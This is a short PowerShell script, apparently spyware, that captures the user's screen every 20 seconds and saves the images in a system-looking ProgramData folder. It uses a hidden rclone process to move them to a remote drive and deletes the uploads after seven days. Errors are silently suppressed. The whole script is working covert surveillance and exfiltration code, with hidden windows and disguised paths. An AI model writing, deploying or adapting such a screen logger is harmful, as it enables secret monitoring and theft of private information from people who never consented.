$BaseDir = "C:\ProgramData\SystemData"
$LogDir = "$BaseDir\Logs"
$RclonePath = "$BaseDir\rclone.exe"
$DriveName = "bug:.host_name"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while($true) {
    try {
        $Time = Get-Date -Format "ss-mm-HH_dd"
        $File = "$LogDir\Log_$Time.jpg"

        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $Bitmap = New-Object System.Drawing.Bitmap -ArgumentList $Screen.Bounds.Width, $Screen.Bounds.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($Screen.Bounds.Left, $Screen.Bounds.Top, 0, 0, $Bitmap.Size)
        
        # Jpeg quality 50%
        $Bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $Graphics.Dispose()
        $Bitmap.Dispose()

        # 2. Rclone Move: Local files ko Drive par bhejna
        Start-Process -FilePath $RclonePath -ArgumentList "move", "$LogDir", "$DriveName", "--quiet" -WindowStyle Hidden -Wait

        # 3. AUTO-DELETE: Drive par jo files 7 din se purani hain unhe urana
        # --min-age 7d ka matlab hai 7 din se purani files
        Start-Process -FilePath $RclonePath -ArgumentList "delete", "$DriveName", "--min-age", "7d", "--quiet" -WindowStyle Hidden
    }
    catch {
        # Error aaye to khamosh raho
    }

    Start-Sleep -Seconds 20
}